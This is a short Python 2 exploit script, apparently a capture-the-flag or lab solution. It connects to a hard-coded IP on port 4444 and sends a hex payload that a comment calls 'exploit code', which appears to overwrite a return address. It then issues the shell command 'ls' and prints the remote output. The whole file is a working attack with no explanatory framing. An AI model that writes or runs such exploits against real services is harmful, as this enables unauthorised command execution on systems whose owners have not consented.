import socket

HOST = '23.98.66.138'    # The remote host
PORT = 4444              # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
# send exploit code
s.sendall("10000000".decode('hex'))
s.sendall("1e00000000000000B206400000000000".decode('hex'))

s.sendall("ls \n")
while 1:
	data = s.recv(1024)
	if len(data) == 0:
		break
	print data
	
s.close()